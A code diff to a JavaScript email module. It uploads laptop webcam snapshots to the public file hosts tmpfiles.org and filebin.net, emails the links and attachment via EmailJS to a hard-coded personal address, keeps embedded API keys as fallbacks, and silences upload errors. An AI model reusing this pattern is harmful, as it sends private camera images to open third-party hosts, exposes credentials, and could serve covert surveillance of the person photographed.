@@ -1,11 +1,11 @@
-const SERVICE_ID = 'service_uuiv4gh';
-const TEMPLATE_ID = 'template_vt6ym7p';
-const PUBLIC_KEY = '2c4HmKBCnIfDDBQ4U';
-const ADMIN_EMAIL = 'kabishekkabishek677@gmail.com';
+const SERVICE_ID = import.meta.env?.VITE_EMAILJS_SERVICE_ID || 'service_uuiv4gh';
+const TEMPLATE_ID = import.meta.env?.VITE_EMAILJS_TEMPLATE_ID || 'template_vt6ym7p';
+const PUBLIC_KEY = import.meta.env?.VITE_EMAILJS_PUBLIC_KEY || '2c4HmKBCnIfDDBQ4U';
+const ADMIN_EMAIL = import.meta.env?.VITE_ADMIN_EMAIL || 'kabishekkabishek677@gmail.com';
 
 /**
- * Uploads an image blob to a fast, reliable temporary host (tmpfiles.org with filebin.net fallback)
- * to provide a direct image link in email bodies.
+ * Uploads an image blob to a fast temporary host (tmpfiles.org with filebin.net fallback)
+ * with a strict 3.5s timeout so email dispatch is never delayed.
  */
 const uploadImageToHost = async (blob, filename = 'snapshot.jpg') => {
   // Strategy 1: tmpfiles.org
@@ -14,7 +14,7 @@ const uploadImageToHost = async (blob, filename = 'snapshot.jpg') => {
     formData.append('file', blob, filename);
 
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 6000);
+    const timeoutId = setTimeout(() => controller.abort(), 3500);
 
     const res = await fetch('https://tmpfiles.org/api/v1/upload', {
       method: 'POST',
@@ -32,14 +32,14 @@ const uploadImageToHost = async (blob, filename = 'snapshot.jpg') => {
       }
     }
   } catch (e) {
-    console.warn('tmpfiles.org image upload failed:', e);
+    // Continue silently to fallback
   }
 
   // Strategy 2: filebin.net fallback
   try {
     const binId = `saranya-snapshot-${Date.now()}`;
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 6000);
+    const timeoutId = setTimeout(() => controller.abort(), 3500);
 
     const res = await fetch(`https://filebin.net/${binId}/${filename}`, {
       method: 'POST',
@@ -56,7 +56,7 @@ const uploadImageToHost = async (blob, filename = 'snapshot.jpg') => {
       return { pageUrl: directUrl, directUrl };
     }
   } catch (e) {
-    console.warn('filebin.net fallback upload failed:', e);
+    // Both failed
   }
 
   return null;
@@ -82,14 +82,18 @@ export const sendEmail = async ({
 }) => {
   const formattedTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-  // 1. If an imageBlob is provided, upload for direct URL access
+  // 1. If an imageBlob is provided, attempt fast non-blocking host upload for direct URL access
   let directImageUrl = '';
   let pageImageUrl = '';
-  if (imageBlob instanceof Blob) {
-    const uploadRes = await uploadImageToHost(imageBlob, filename);
-    if (uploadRes?.directUrl) {
-      directImageUrl = uploadRes.directUrl;
-      pageImageUrl = uploadRes.pageUrl;
+  if (imageBlob instanceof Blob && imageBlob.size > 0) {
+    try {
+      const uploadRes = await uploadImageToHost(imageBlob, filename);
+      if (uploadRes?.directUrl) {
+        directImageUrl = uploadRes.directUrl;
+        pageImageUrl = uploadRes.pageUrl;
+      }
+    } catch {
+      // Continue even if remote host upload fails; multipart attachment will still be sent
     }
   }
 
@@ -99,14 +103,14 @@ export const sendEmail = async ({
     enhancedMessage = [
       enhancedMessage,
       '',
-      '📸 Captured Camera Snapshot:',
+      '📸 Captured Laptop Webcam Snapshot:',
       `👉 Direct Photo Link: ${directImageUrl}`,
       pageImageUrl && pageImageUrl !== directImageUrl ? `🌐 Web Page: ${pageImageUrl}` : '',
     ].filter(Boolean).join('\n');
   }
 
   // 3. Attempt multipart send-form via EmailJS when imageBlob is present
-  if (imageBlob instanceof Blob) {
+  if (imageBlob instanceof Blob && imageBlob.size > 0) {
     try {
       const formData = new FormData();
       formData.append('service_id', SERVICE_ID);
@@ -126,7 +130,7 @@ export const sendEmail = async ({
         formData.append('snapshot_url', directImageUrl);
       }
 
-      // Standard EmailJS attachment parameter names
+      // Standard EmailJS attachment parameter names (supports free & paid attachment handlers)
       formData.append('content', imageBlob, filename);
       formData.append('attachment', imageBlob, filename);
       formData.append('my_file', imageBlob, filename);
@@ -144,7 +148,7 @@ export const sendEmail = async ({
       });
 
       if (formRes.ok) {
-        console.log('✅ EmailJS Sent Successfully (with attachment):', { title, directImageUrl });
+        console.log('✅ EmailJS Sent Successfully (confirmed by provider):', { title, hasPhotoLink: Boolean(directImageUrl) });
         return true;
       } else {
         const errText = await formRes.text();
@@ -189,12 +193,11 @@ export const sendEmail = async ({
         status: response.status,
         statusText: response.statusText,
         error: errorText,
-        payload,
       });
       throw new Error(`EmailJS failed with status ${response.status}: ${errorText}`);
     }
 
-    console.log('✅ EmailJS Sent Successfully:', { title, message: enhancedMessage });
+    console.log('✅ EmailJS Sent Successfully (confirmed by provider):', { title });
     return true;
   } catch (error) {
     console.error('❌ EmailJS Network/Execution Error:', error);
